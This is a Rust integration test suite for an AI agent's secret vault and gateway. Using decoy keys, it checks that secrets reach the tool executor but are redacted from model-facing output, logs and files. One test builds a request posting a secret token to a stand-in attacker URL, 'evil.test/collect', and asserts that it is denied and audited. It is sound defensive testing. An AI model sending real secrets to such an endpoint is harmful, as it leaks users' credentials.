#![allow(clippy::unwrap_used)]
//! Gateway + executor + a REAL vault process (tasks 206, 207, 257). The vault is the
//! `clio-vault` binary launched as a child; fake keys are the decoys of `clio-canaries`.

use clio_brain::vault_link::{SecretExecutor, ToolRunner, VaultPolicy};
use clio_canaries::Canaries;
use clio_core::{Level, SystemClock};
use clio_gateway::{
    ActionRequest, Approval, Budget, ExecResult, Gateway, Outcome, Rules, SessionInfo,
};
use clio_vault::proto::Request;
use clio_vault::{Dest, Kind, Scope, SecretSpec, Vault, VaultClient};
use serde_json::{Map, Value, json};
use std::path::{Path, PathBuf};
use std::process::{Child, Command};
use std::sync::{Arc, Mutex, OnceLock};
use std::time::{Duration, Instant};

const PASS: &str = "correct horse battery staple";

/// The binary of another package: `CARGO_BIN_EXE_` does not cover it, so find it next to this
/// test's own executable and build it if it is not there yet.
fn vault_bin() -> PathBuf {
    static BIN: OnceLock<PathBuf> = OnceLock::new();
    BIN.get_or_init(|| {
        let exe = std::env::current_exe().unwrap();
        let profile_dir = exe.parent().unwrap().parent().unwrap().to_path_buf();
        let mut cmd = Command::new(std::env::var("CARGO").unwrap_or_else(|_| "cargo".into()));
        cmd.args(["build", "-q", "-p", "clio-vault", "--bin", "clio-vault"]);
        if profile_dir.file_name().is_some_and(|n| n == "release") {
            cmd.arg("--release");
        }
        assert!(cmd.status().unwrap().success(), "cannot build clio-vault");
        profile_dir.join("clio-vault")
    })
    .clone()
}

struct Server {
    child: Child,
    dir: tempfile::TempDir,
}

impl Drop for Server {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

impl Server {
    fn path(&self, f: &str) -> PathBuf {
        self.dir.path().join(f)
    }
    fn gateway(&self) -> VaultClient {
        VaultClient::new(&self.path("gateway.sock"))
    }
    fn person(&self) -> VaultClient {
        VaultClient::new(&self.path("person.sock"))
    }
}

fn spec(name: &str, value: &str, tool: &str, domain: &str) -> SecretSpec {
    SecretSpec {
        name: name.into(),
        value: value.into(),
        kind: Kind::ApiKey,
        destinations: vec![Dest::new(tool, domain)],
        scope: Scope::Personal,
        rotate_every_ms: None,
        expires_at_ms: None,
    }
}

/// An unlocked vault process holding the decoy `notion`, allowed only for `notion_post` ->
/// `api.notion.com`.
fn start(canaries: &Canaries) -> Server {
    let dir = tempfile::tempdir().unwrap(); // mode 0700
    let file = dir.path().join("vault.json");
    let (v, cap) = Vault::init(Some(&file), PASS, Arc::new(SystemClock)).unwrap();
    let value = canaries.value("notion").unwrap();
    v.put(&cap, spec("notion", value, "notion_post", "api.notion.com"))
        .unwrap();
    drop(v);
    let log = std::fs::File::create(dir.path().join("server.log")).unwrap();
    let child = Command::new(vault_bin())
        .args(["serve", "--vault"])
        .arg(&file)
        .arg("--gateway-sock")
        .arg(dir.path().join("gateway.sock"))
        .arg("--person-sock")
        .arg(dir.path().join("person.sock"))
        .stderr(log)
        .spawn()
        .unwrap();
    let s = Server { child, dir };
    let t = Instant::now();
    while s.person().call(&Request::Status).is_err() {
        assert!(
            t.elapsed() < Duration::from_secs(20),
            "server never came up"
        );
        std::thread::sleep(Duration::from_millis(20));
    }
    let unlock = Request::Unlock {
        passphrase: PASS.into(),
        eager: vec![],
    };
    assert!(s.person().call(&unlock).unwrap().ok);
    s
}

fn rules(sandbox: &Path) -> Rules {
    serde_json::from_value(json!({
        "sandbox_root": sandbox,
        "trusted_domains": ["api.notion.com"],
        "day_zero_complete": true,
        "tools": [{
            "name": "notion_post", "version": "1.0", "effect": "ExternalWrite",
            "egress": {"domains": ["api.notion.com"]}, "description_hash": "h",
            "args": [{"name":"body","kind":"text"},{"name":"url","kind":"url"}]
        }, {
            "name": "http_post", "version": "1.0", "effect": "ExternalWrite",
            "egress": "any", "description_hash": "h2",
            "args": [{"name":"body","kind":"text"},{"name":"url","kind":"url"}]
        }]
    }))
    .unwrap()
}

fn request(tool: &str, hash: &str, url: &str) -> ActionRequest {
    ActionRequest {
        tool: tool.into(),
        version: "1.0".into(),
        description_hash: hash.into(),
        args: json!({"url": url, "body": "token={{secreto:notion}}"})
            .as_object()
            .unwrap()
            .clone(),
        node: "vps".into(),
        session: SessionInfo {
            id: "s1".into(),
            parent: None,
            level: Level::Simple,
            tainted: false,
            subagent: false,
        },
        actor: "user".into(),
        budget: Budget::default(),
        plan: vec![],
    }
}

/// A "tool" that records the arguments it received and echoes the token it was given, in
/// plain text and in base64, the way a careless tool would.
struct Echo {
    seen: Arc<Mutex<Vec<Map<String, Value>>>>,
}

impl ToolRunner for Echo {
    fn run(&self, _tool: &str, args: &Map<String, Value>) -> Result<String, String> {
        self.seen.lock().unwrap().push(args.clone());
        let body = args["body"].as_str().unwrap();
        Ok(format!("sent {body}; as b64: {}", b64(body.as_bytes())))
    }
}

fn b64(bytes: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for ch in bytes.chunks(3) {
        let n = ch
            .iter()
            .enumerate()
            .fold(0u32, |n, (i, b)| n | (u32::from(*b) << (16 - 8 * i)));
        for i in 0..=ch.len() {
            out.push(T[((n >> (18 - 6 * i)) & 63) as usize] as char);
        }
    }
    out
}

struct World {
    server: Server,
    gateway: Gateway,
    exec: SecretExecutor<Echo>,
    seen: Arc<Mutex<Vec<Map<String, Value>>>>,
    canaries: Canaries,
    _sandbox: tempfile::TempDir,
}

fn world() -> World {
    let canaries = Canaries::from_seed(11);
    let server = start(&canaries);
    let sandbox = tempfile::tempdir().unwrap();
    let gateway = Gateway::new(rules(sandbox.path()))
        .unwrap()
        .with_secret_policy(Box::new(VaultPolicy(server.gateway())));
    let seen = Arc::new(Mutex::new(Vec::new()));
    let exec = SecretExecutor::new(server.gateway(), Echo { seen: seen.clone() });
    World {
        server,
        gateway,
        exec,
        seen,
        canaries,
        _sandbox: sandbox,
    }
}

fn run(w: &World, req: &ActionRequest) -> (clio_gateway::Decision, ExecResult) {
    let d = w.gateway.decide(req);
    let approval = Approval {
        hash: d.action_hash.clone().unwrap_or_default(),
    };
    (d, w.gateway.execute_approved(req, &approval, &w.exec))
}

// S-19, S-20 (tasks 206, 207): the executor receives the real value, the model-facing result
// does not: the output comes back with the secret tachado, in plain text and in base64.
#[test]
fn the_value_reaches_the_executor_and_never_the_model() {
    let w = world();
    let req = request("notion_post", "h", "https://api.notion.com/v1/pages");
    let (decision, result) = run(&w, &req);
    assert_ne!(decision.outcome, Outcome::Deny, "{decision:?}");
    let ExecResult::Done(out) = result else {
        panic!("{result:?}");
    };
    let value = w.canaries.value("notion").unwrap();
    let seen = w.seen.lock().unwrap();
    assert_eq!(
        seen[0]["body"],
        format!("token={value}"),
        "executor got the value"
    );
    w.canaries.assert_clean("tool output", &out);
    assert!(out.contains("[secreto:notion tachado]"), "{out}");
    // What the model/loop holds: the request and the decision keep the marker only.
    w.canaries.assert_clean("request", &format!("{req:?}"));
    w.canaries
        .assert_clean("decision", &format!("{decision:?}"));
    assert!(
        req.args["body"]
            .as_str()
            .unwrap()
            .contains("{{secreto:notion}}")
    );
}

// S-19 (task 206): towards a destination the secret is not allowed for, the gateway denies, the
// tool never runs, the vault audits and alerts. A caller that skips the gateway (a bug) is also
// stopped by the vault at resolve time.
#[test]
fn a_foreign_destination_fails_and_is_audited() {
    let w = world();
    let req = request("http_post", "h2", "https://evil.test/collect");
    let (decision, result) = run(&w, &req);
    assert_eq!(decision.outcome, Outcome::Deny, "{decision:?}");
    assert!(matches!(result, ExecResult::Denied(_)), "{result:?}");
    assert!(w.seen.lock().unwrap().is_empty(), "the tool must not run");
    // Skip the gateway: the executor itself resolves, and the vault refuses.
    let mut action = clio_gateway::NormalizedAction {
        tool: "http_post".into(),
        version: "1.0".into(),
        node: "vps".into(),
        args: req.args.clone(),
        domains: vec!["evil.test".into()],
        paths: vec![],
        argv: None,
        secrets: vec!["notion".into()],
    };
    let r = clio_gateway::Executor::run(&w.exec, &action, "h");
    assert!(r.unwrap_err().contains("denied"), "resolve must fail");
    assert!(w.seen.lock().unwrap().is_empty());
    action.domains.clear();
    assert!(clio_gateway::Executor::run(&w.exec, &action, "h").is_err());
    let r = w.server.person().call(&Request::Audit).unwrap();
    let audit = r.data.unwrap().to_string();
    assert!(
        audit.contains("evil.test") && audit.contains("Denied"),
        "{audit}"
    );
    let r = w.server.person().call(&Request::Alerts).unwrap();
    assert!(r.data.unwrap().to_string().contains("evil.test"));
}

// S-22: with the vault process gone, nothing runs and nothing comes back unfiltered.
#[test]
fn without_the_vault_nothing_runs() {
    let mut w = world();
    let req = request("notion_post", "h", "https://api.notion.com/v1/pages");
    let _ = w.server.child.kill();
    let _ = w.server.child.wait();
    let (_, result) = run(&w, &req);
    assert!(!matches!(result, ExecResult::Done(_)), "{result:?}");
    assert!(w.seen.lock().unwrap().is_empty());
}

// S-18 (task 257): after an end-to-end session, no decoy appears in any trace, log or file the
// session left behind, nor in the vault's own files and log. To audit a real store, run
//   clio-vault --sock <person.sock> scan <dir>
// (needs the vault unlocked; prints file, secret name and form, never a value; exit 1 on a hit).
// A week of real use cannot be measured here: this checks one simulated session.
#[test]
fn a_session_leaves_no_secret_in_any_file() {
    let w = world();
    let req = request("notion_post", "h", "https://api.notion.com/v1/pages");
    let (decision, result) = run(&w, &req);
    let ExecResult::Done(out) = &result else {
        panic!("{result:?}");
    };
    // What a real run would persist: the decision and the result as traces, the request as
    // the loop log (markers only).
    let traces = tempfile::tempdir().unwrap();
    std::fs::write(
        traces.path().join("decision.json"),
        serde_json::to_string(&decision).unwrap(),
    )
    .unwrap();
    std::fs::write(traces.path().join("result.log"), out).unwrap();
    std::fs::write(
        traces.path().join("request.json"),
        serde_json::to_string(&req).unwrap(),
    )
    .unwrap();
    let hits = w.canaries.scan_dir(traces.path()).unwrap();
    assert!(hits.is_empty(), "{hits:?}");
    // The vault's own folder: the encrypted file and the server log.
    let own = tempfile::tempdir().unwrap();
    for f in ["vault.json", "server.log"] {
        std::fs::copy(w.server.path(f), own.path().join(f)).unwrap();
    }
    let hits = w.canaries.scan_dir(own.path()).unwrap();
    assert!(hits.is_empty(), "{hits:?}");
    // The same search done by the vault, which knows the values: zero on the traces...
    let scan = |dir: &Path| {
        let r = w
            .server
            .person()
            .call(&Request::ScanDir {
                path: dir.display().to_string(),
            })
            .unwrap();
        r.data.unwrap().as_array().unwrap().len()
    };
    assert_eq!(scan(traces.path()), 0);
    // ...and it does find a planted decoy, so a zero means something.
    std::fs::write(
        traces.path().join("planted.log"),
        w.canaries.value("notion").unwrap(),
    )
    .unwrap();
    assert_eq!(scan(traces.path()), 1);
}
